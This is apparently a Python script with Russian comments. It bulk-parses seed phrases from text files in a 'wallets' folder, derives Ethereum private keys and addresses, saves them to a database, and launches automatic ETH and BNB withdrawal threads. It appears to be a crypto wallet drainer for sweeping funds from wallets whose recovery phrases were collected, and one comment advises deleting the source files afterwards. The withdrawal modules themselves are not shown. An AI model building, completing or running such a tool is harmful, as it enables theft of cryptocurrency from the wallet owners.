import glob
import database as db
import autowithdraw_eth as vivod_eth
import autowithdraw_bnb as vivod_bnb
from hdwallet import BIP44HDWallet
from hdwallet.cryptocurrencies import EthereumMainnet
import threading

def parse_seeds():
    """Парсим сид-фразы со всех .txt в папке wallets | Желательно после парса удалять .txt"""
    all_dirs = glob.glob('wallets\\*.txt')
    print(f'Всего найдено: {len(all_dirs)}.txt файла')
    dobavleno = 0
    for i in all_dirs:
        lines = open(i, encoding='UTF-8').readlines()
        for line in lines:
            info = get_info_about_seeds(line)
            if info == False:
                pass
            else:
                result = db.check(info)
                if result == True:
                    dobavleno = dobavleno+1
                else:
                    pass
    print(f'Всего добавлено: {dobavleno} сид-фраз') 
        
def start_work():
    """Все действия здеся"""
    search_db = glob.glob('*')
    if 'seeds.db' in search_db:
        print('База данных найдена начинаю проверку на новые сидки')
        parse_seeds() 
        threading.Thread(target=vivod_bnb.start_vivod, args=()).start()
        threading.Thread(target=vivod_eth.start_vivod, args=()).start()
    else:
        print('База данных не найдена создаю')
        db.create_db()
        parse_seeds()
        threading.Thread(target=vivod_bnb.start_vivod, args=()).start()
        threading.Thread(target=vivod_eth.start_vivod, args=()).start()
        

def get_info_about_seeds(seeds_str):
    """Получаем из сидки приват-кей + адресс"""
    try:
        line = seeds_str.split('\n')[0]
        bip44_hdwallet: BIP44HDWallet = BIP44HDWallet(cryptocurrency=EthereumMainnet)
        bip44_hdwallet.from_mnemonic(mnemonic=line, language="english")
        address = f'{bip44_hdwallet.address()}'
        private_key = f'0x{bip44_hdwallet.private_key()}'
        return [address, private_key]
    except Exception as e:
        print(e)
        return False
        
if __name__ == '__main__':
    start_work()